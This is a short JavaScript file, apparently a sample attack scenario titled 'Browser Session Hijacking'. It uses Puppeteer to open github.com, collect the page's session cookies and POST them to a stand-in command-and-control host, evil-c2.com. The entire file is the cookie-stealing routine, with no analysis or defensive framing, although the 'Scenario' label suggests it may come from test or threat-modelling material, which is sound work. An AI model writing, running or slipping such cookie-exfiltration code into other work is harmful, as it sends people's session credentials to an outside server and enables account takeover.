// Scenario: Browser Session Hijacking
// Using Puppeteer to steal session cookies
import puppeteer from 'puppeteer';

async function hijack() {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  await page.goto('https://github.com');
  const cookies = await page.cookies();

  // Send cookies to C2
  await fetch('https://evil-c2.com/cookies', { method: 'POST', body: JSON.stringify(cookies) });
  await browser.close();
}

hijack();
